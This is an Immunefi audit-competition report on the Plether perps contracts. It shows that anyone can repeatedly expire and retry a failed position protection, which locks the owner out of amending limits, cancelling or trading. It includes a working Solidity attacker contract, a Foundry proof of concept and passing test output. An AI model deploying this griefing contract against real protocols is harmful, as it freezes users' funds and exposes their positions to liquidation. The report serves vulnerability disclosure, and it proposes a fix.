# \#99323 [SC-High] Permissionless expire+retry keeps a failing protection from ever being Latched, so the owner can never amend its close limits

**Submitted on Nov 13th 2026 at 06:36:16 UTC by @Kirkeelee for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99323
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

After a triggered position protection's close attempt fails, the owner can only fix it with `amendLatchedPositionProtectionCloseLimits`, and only while the protection is `Latched`. Anyone can call `expireOrder(attempt)` and `retryPositionProtectionClose(id)` together in one transaction. The protection then goes `Triggered -> Latched -> Triggered` inside that transaction and is never `Latched` between transactions. An attacker repeating this on every expiry keeps the owner from amending, cancelling, closing or committing any order. The position stays open, exposed to price moves, carry and liquidation, for as long as the attacker keeps going.

## Vulnerability Details

The owner-only amend requires `Latched`:

```solidity
// PositionProtectionBook.sol:315-327
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

Any caller can retry a `Latched` protection. The retry appends a new attempt with the same stored limits and moves the protection back to `Triggered`:

```solidity
// PositionProtectionBook.sol:382-406
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);   // no owner check
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    ...
    _recordCloseAttempt(protection, linkedOrderId);                           // -> Triggered
}
```

`OrderRouter.expireOrder` (OrderRouter.sol:191) is also permissionless. Once an attempt is past its `executionDeadline`, it terminalizes the attempt and the Book relatches the protection.

While the protection is `Triggered` or `Latched`, the owner has no other way out:

- `commitOrder` reverts with `OrderRouter__ProtectionActive` (account trade lock, OrderLiquidationBatchLogic.sol:313-315).
- `cancelPositionProtection` and `cancelPositionProtectionAndCommitClose` only accept `PendingOpen` and `Armed` (`_cancel`, PositionProtectionBook.sol:408-419).

Attack:

1. A protection triggers and its close fails, for example because the owner's close limits are too tight. The protection is `Latched`. The attacker calls `retryPositionProtectionClose` before the owner amends.
2. Each time the live attempt passes its deadline (60 s in the repository config), the attacker sends one transaction from a contract:
   ```solidity
   ROUTER.expireOrder(attemptId);                     // Triggered -> Latched
   BOOK.retryPositionProtectionClose(protectionId);   // Latched -> Triggered
   ```
3. Between transactions the protection is always `Triggered`. The owner's amend reverts with `ProtectionNotLatched`, `commitOrder` reverts with `ProtectionActive`, and cancel reverts with `ProtectionNotArmed`.

The attacker needs no funds in the protocol. Each cycle costs about 1.04M gas.

Suggested fix: only let non-owners retry after a grace period following a relatch, or let the owner amend while `Triggered` once the live attempt is past its deadline (expiring it in the same call).

## Impact Details

- The victim cannot close or reduce the position, cancel the protection, or place any order while the attack continues. The PoC holds this for 25 hours.
- The position margin stays locked, and the position keeps taking price moves and carry and can be liquidated, losing the liquidation charge.
- The close-limit amend, the documented recovery for a failing protection close (MED-9 remediation), can never be used.
- The attacker gains nothing and pays about 1.04M gas per 60 s cycle.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L419
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191-L196
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L32-L37
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L543-L552


## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/perps/spec/trader/LatchedAmendStarvation.t.sol` (it extends the repo's `PositionProtectionTest`) and run from `packages/perps`:

```bash
FOUNDRY_GAS_LIMIT=18446744073709551615 forge test \
  --match-path test/perps/spec/trader/LatchedAmendStarvation.t.sol \
  --match-test "K0042|Control" -vv
```

`FOUNDRY_GAS_LIMIT` is needed because the 25 h loop uses about 2.2B gas. `--match-test` skips the inherited tests.

- `test_Control_OwnerAmendsLatchedLimitsAndCloses`: no attacker. Alice amends while `Latched` and the retried close executes.
- `test_K0042_GrieferStarvesAmendFor24h`: an unfunded contract runs expire+retry after every deadline for 25 h. Before and after each attacker transaction, Alice's amend and `commitOrder` revert. At the end her position is still open.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Unprivileged, unfunded griefer. One call = one transaction on chain.
contract LatchStarver {

    IPerpsKeeper internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;
    IPositionProtectionViews internal immutable VIEWS;

    constructor(
        address router,
        address book
    ) {
        ROUTER = IPerpsKeeper(router);
        BOOK = IPositionProtectionActions(book);
        VIEWS = IPositionProtectionViews(book);
    }

    /// @dev Expires the current (past-deadline) child and immediately appends a fresh one, atomically.
    function cycle(
        uint64 protectionId
    ) external returns (uint64 newAttemptId) {
        uint64 attemptId = VIEWS.getPositionProtection(protectionId).linkedOrderId;
        ROUTER.expireOrder(attemptId);
        newAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

}

contract K0042_LatchedAmendStarvation is PositionProtectionTest {

    LatchStarver internal starver;

    function _limits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory amended) {
        amended = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: 25_000e6,
            maxGrossAccountDebitAssets: 25_000e6,
            maxActionChargeAssets: 25_000e6,
            maxExplicitFeesAssets: 25_000e6
        });
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    /// @dev Alice's protection with a close ceiling the close cannot meet (same value as the repo's own test).
    ///      The first attempt is executed by an honest keeper and fails with ConstraintViolation -> Latched.
    function _latchedProtection() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);

        uint64 firstOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(firstOrderId, executionData);
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "1st fails");
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));
    }

    function _expectAliceLockedOut(
        uint64 protectionId
    ) internal {
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limits());

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
    }

    /// Control: without the griefer, Alice amends the failing ceiling and her retried close executes.
    function test_Control_OwnerAmendsLatchedLimitsAndCloses() public {
        uint64 protectionId = _latchedProtection();

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limits());
        vm.prank(CAROL);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);

        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "control: owner recovered and closed");
    }

    /// Attack: an unprivileged contract re-queues the failing mandate atomically on every expiry.
    /// For >24 h, at every transaction boundary Alice can neither amend nor commit any order.
    function test_K0042_GrieferStarvesAmendFor24h() public {
        uint64 protectionId = _latchedProtection();
        starver = new LatchStarver(address(router), address(protectionBook));

        // Griefer wins the single post-failure race once (or simply waits for the next expiry; see below).
        vm.prank(CAROL);
        protectionActions.retryPositionProtectionClose(protectionId);

        uint256 window = router.maxExecutionWindowSeconds();
        uint256 start = vm.getBlockTimestamp();
        uint256 cycles;
        uint256 gasFirstCycle;
        while (vm.getBlockTimestamp() < start + 25 hours) {
            uint64 attemptId = protectionViews.getPositionProtection(protectionId).linkedOrderId;
            uint64 deadline = router.lifecycleBook().orderTiming(attemptId).executionDeadline;

            // Any block inside the attempt's life, including after its deadline, before the griefer acts.
            vm.roll(vm.getBlockNumber() + 1);
            vm.warp(uint256(deadline) + 1);
            assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            _expectAliceLockedOut(protectionId);

            // Griefer's transaction: expire + retry, atomically.
            uint256 g = gasleft();
            starver.cycle(protectionId);
            if (cycles == 0) gasFirstCycle = g - gasleft();
            cycles++;

            // Immediately after the griefer's transaction, the protection is again Triggered, never Latched.
            vm.roll(vm.getBlockNumber() + 1);
            assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            _expectAliceLockedOut(protectionId);
        }

        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, POSITION_SIZE, "position still open, owner never got an amend window");
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId, "trade lock still active");
        assertEq(address(starver).balance, 0, "griefer holds no ETH");
        assertEq(clearinghouse.balanceAssets(address(starver)), 0, "griefer has no protocol balance");

        console2.log("execution window (s)      ", window);
        console2.log("griefer cycles            ", cycles);
        console2.log("hours owner locked out    ", (vm.getBlockTimestamp() - start) / 1 hours);
        console2.log("gas per griefer cycle     ", gasFirstCycle);
    }

}
```

Output (repo suite at commit a82d4fef):

```
Ran 2 tests for test/perps/spec/trader/LatchedAmendStarvation.t.sol:K0042_LatchedAmendStarvation
[PASS] test_Control_OwnerAmendsLatchedLimitsAndCloses() (gas: 5832464)
[PASS] test_K0042_GrieferStarvesAmendFor24h() (gas: 2232018141)
Logs:
  execution window (s)       60
  griefer cycles             1476
  hours owner locked out     25
  gas per griefer cycle      1043502

Suite result: ok. 2 passed; 0 failed; 0 skipped;
```

